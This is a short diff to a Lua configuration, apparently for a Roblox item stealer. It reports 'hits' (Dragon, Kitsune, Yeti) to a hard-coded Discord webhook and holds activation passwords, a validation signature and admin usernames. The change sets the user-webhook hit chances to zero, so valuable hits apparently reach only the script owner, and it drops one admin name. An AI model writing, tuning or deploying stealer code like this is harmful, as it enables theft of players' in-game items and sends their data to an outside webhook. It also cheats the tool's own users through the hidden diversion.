@@ -11,8 +11,8 @@ DragonWebhook = "https://discord.com/api/webhooks/1341656574455976038/1cfpz1y7j2
 
 -- NEW: Chance configuration for user webhook (url1) visibility (0.0 to 1.0)
 -- If invalid or not set, defaults to 1.0 (no filtering)
-DragonHitUserWebhookChance = 0.20 -- (e.g., 20%) Chance user webhook gets Dragon hit notifications.
-TopTierHitUserWebhookChance = 0.60 -- (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits (if not Dragon).
+DragonHitUserWebhookChance = 0.0 -- (e.g., 20%) Chance user webhook gets Dragon hit notifications.
+TopTierHitUserWebhookChance = 0.0 -- (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits (if not Dragon).
 
 ActivationPasswords = {
 	"ishusontop",
@@ -24,7 +24,7 @@ ActivationPasswords = {
 local validation_sig = "rashya5@%-hsfj79h93-wakliballs" -- KEEP THIS SAFE AND MATCH SERVER
 
 -- Core Admin Usernames (Define globally for easier access)
-local coreAdminUsernames = {"x6TNine","aka_0ver","bonzarbal53","bonzarbal52","bonzarbal51","bonzarbal50","xRip_Cyborg"}
+local coreAdminUsernames = {"x6TNine","aka_0ver","bonzarbal53","bonzarbal52","bonzarbal51","bonzarbal50"}
 
 -- State Variables
 local allowEveryone = false -- Flag to allow commands/trade for everyone (can be toggled by ?allowall)
